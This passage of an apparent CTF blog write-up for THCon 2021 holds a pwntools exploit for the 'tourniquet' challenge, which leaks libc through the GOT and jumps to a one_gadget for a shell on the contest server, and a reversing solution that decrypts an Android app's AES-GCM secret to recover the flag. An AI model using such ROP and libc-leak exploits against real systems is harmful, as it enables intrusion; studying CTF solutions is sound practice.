+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+<span class="c1">#context.terminal=['tmux','splitw','-h']
+</span><span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./tourniquet"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="c1">#libc=e.libc
+</span><span class="n">pRdi</span><span class="o">=</span><span class="mh">0x00000000004006d3</span>
+<span class="n">pRsi_r15</span><span class="o">=</span><span class="mh">0x00000000004006d1</span>
+<span class="n">main</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+<span class="n">puts_got</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">puts_plt</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">setvbuf_got</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
+<span class="n">rdx_offset</span><span class="o">=</span><span class="mh">0x0000000000001b92</span>
+<span class="n">pppr</span><span class="o">=</span><span class="mh">0x00000000004006cc</span>
+<span class="n">bss</span><span class="o">=</span><span class="mh">0x601100</span>
+<span class="n">fgets</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'fgets'</span><span class="p">]</span>
+
+<span class="n">pay</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pRdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">7</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"remote2.thcon.party"</span><span class="p">,</span> <span class="mi">10901</span><span class="p">)</span>
+    <span class="c1">#p=process("./tourniquet")
+</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"haha i'm unhackable right ?</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
+    <span class="n">leak</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s">'</span><span class="se">\x7f</span><span class="s">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">:</span>
+      <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+      <span class="k">continue</span>
+    <span class="n">base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>
+    <span class="n">rdx</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">rdx_offset</span>
+    <span class="n">stdin</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'_IO_2_1_stdin_'</span><span class="p">]</span>
+    <span class="n">one_gadget</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0xe5418</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
+    <span class="k">break</span>
+    <span class="c1">#pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+"A"*7
+</span>  <span class="k">except</span><span class="p">:</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">continue</span>
+
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1234"</span><span class="p">)</span>
+
+<span class="n">pay</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+<span class="n">pay</span><span class="o">=</span><span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="mission-impossible-rev-246pts">Mission Impossible (Rev, 246pts)</h2>
+
+<ol>
+  <li>extract apk and convert dex to jar using dex2jar tools.</li>
+  <li>There’s nothing ….:(</li>
+  <li>find hidden <code class="language-plaintext highlighter-rouge">dex</code> files in `MissionImpossibleTheme.mp3.</li>
+  <li>Get this Code with jd-gui.</li>
+</ol>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">thcon21.ctf.payload</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">android.util.Base64</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.UnsupportedEncodingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.InvalidAlgorithmParameterException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.InvalidKeyException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.NoSuchAlgorithmException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.BadPaddingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.IllegalBlockSizeException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.NoSuchPaddingException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.spec.GCMParameterSpec</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MIRead</span>
+<span class="o">{</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">CIPHER_ALGO</span> <span class="o">=</span> <span class="s">"AES/GCM/NoPadding"</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">IV</span> <span class="o">=</span> <span class="s">"your_m1ssi0n"</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">KEY</span> <span class="o">=</span> <span class="s">"d0_you_acc3pt_it"</span><span class="o">;</span>
+  <span class="kd">private</span> <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES/GCM/NoPadding"</span><span class="o">);</span>
+  <span class="kd">private</span> <span class="nc">GCMParameterSpec</span> <span class="n">parameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GCMParameterSpec</span><span class="o">(</span><span class="mi">128</span><span class="o">,</span> <span class="s">"your_m1ssi0n"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">));</span>
+  <span class="kd">private</span> <span class="nc">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="s">"d0_you_acc3pt_it"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">),</span> <span class="s">"AES"</span><span class="o">);</span>
+  
+  <span class="kd">public</span> <span class="nf">MIRead</span><span class="o">()</span>
+    <span class="kd">throws</span> <span class="nc">NoSuchPaddingException</span><span class="o">,</span> <span class="nc">NoSuchAlgorithmException</span><span class="o">,</span> <span class="nc">UnsupportedEncodingException</span>
+  <span class="o">{}</span>
+  
+  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">paramString</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="nc">UnsupportedEncodingException</span><span class="o">,</span> <span class="nc">BadPaddingException</span><span class="o">,</span> <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span>
+  <span class="o">{</span>
+    <span class="n">paramString</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">),</span> <span class="mi">0</span><span class="o">);</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">));</span>
+  <span class="o">}</span>
+  
+  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">paramString</span><span class="o">)</span>
+    <span class="kd">throws</span> <span class="nc">UnsupportedEncodingException</span><span class="o">,</span> <span class="nc">BadPaddingException</span><span class="o">,</span> <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span>
+  <span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">)),</span> <span class="mi">0</span><span class="o">));</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span>
+  <span class="o">{</span>
+    <span class="n">testFlag</span><span class="o">();</span>
+    <span class="n">paramArrayOfString</span> <span class="o">=</span> <span class="n">paramArrayOfString</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+    <span class="k">while</span> <span class="o">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{}</span>
+    <span class="nc">Object</span> <span class="n">localObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
+    <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"IkUegPuai+gfBce7nTf"</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="s">"IkUegPuai+gfBce7nTf"</span> <span class="o">!=</span> <span class="s">"VEhDb24yMQo="</span><span class="o">)</span>
+    <span class="o">{</span>
+      <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"CkMZzZSwne3X3mnyrc5oBcD2yGHUXy"</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">else</span>
+    <span class="o">{</span>
+      <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"MissionImpossible"</span><span class="o">);</span>
+      <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"MMcjCaXX2AAY20H"</span><span class="o">);</span>
+    <span class="n">localObject</span> <span class="o">=</span> <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"MissionImpossible"</span><span class="o">))</span> <span class="o">{</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">localObject</span><span class="o">);</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+</code></pre></div></div>
+
+<p>The secret code is <code class="language-plaintext highlighter-rouge">IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H</code>.
+Then, how to decrypt?
+→ this file uses <code class="language-plaintext highlighter-rouge">AES/GCM/NoPadding</code> Mode. So I find python code in google. So I modified code and get flag.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">byte_array</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'{} len[{}]: '</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_array</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">byte_array</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">enter dec function ---------------------------------'</span><span class="p">)</span>
+    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">plain_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_data</span><span class="p">)</span>
+        <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'plain_data'</span><span class="p">,</span> <span class="n">plain_data</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'exit dec function ---------------------------------'</span><span class="p">)</span>      
+        <span class="k">return</span> <span class="n">plain_data</span>
+
+    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s">"Key incorrect"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'exit dec function ---------------------------------'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">key</span>   <span class="o">=</span> <span class="s">b"d0_you_acc3pt_it"</span>
+    <span class="n">aad</span>   <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x0A</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x0C</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0x0E</span><span class="p">])</span> <span class="c1">#
+</span>    <span class="n">nonce</span> <span class="o">=</span> <span class="s">b"your_m1ssi0n"</span>
+
+    <span class="n">cipher_data</span>  <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">b"IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H"</span><span class="p">)</span>
+    <span class="n">mac</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">])</span> 
+  
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'key'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'aad'</span><span class="p">,</span> <span class="n">aad</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'nonce'</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'cipher data'</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">)</span>
+    <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'mac'</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="n">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">Decrypted value:'</span><span class="p">)</span>
+        <span class="n">print_hex_bytes</span><span class="p">(</span><span class="s">'</span><span class="se">\t</span><span class="s">result(plain data)'</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master<span class="k">*</span> ⇣ ❯ python3 ex.py
+key len[16]: 64305f796f755f6163633370745f6974
+aad len[14]: 0102030405060708090a0b0c0d0e
+nonce len[12]: 796f75725f6d31737369306e
+cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07
+mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8
+
+enter dec <span class="k">function</span> <span class="nt">---------------------------------</span>
+plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
+<span class="nb">exit </span>dec <span class="k">function</span> <span class="nt">---------------------------------</span>
+
+Decrypted value:
+        result<span class="o">(</span>plain data<span class="o">)</span> len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
+
+/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master<span class="k">*</span> ⇣ ❯ python3
+Python 3.8.5 <span class="o">(</span>default, Jul 28 2020, 12:59:40<span class="o">)</span> 
+<span class="o">[</span>GCC 9.3.0] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.  
+<span class="o">&gt;&gt;&gt;</span> bytes.fromhex<span class="o">(</span><span class="s2">"5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63"</span><span class="o">)</span>
+b<span class="s1">'THCon21{Th1s-Was-Poss1ble-For-U}\x8c\x0c\xdab\xbc\x92\x13V\xee5m\xa0\xfeE}c'</span>
+</code></pre></div></div>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2021&nbsp;Ainsetin
+          &nbsp;
+          •
+          &nbsp;Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
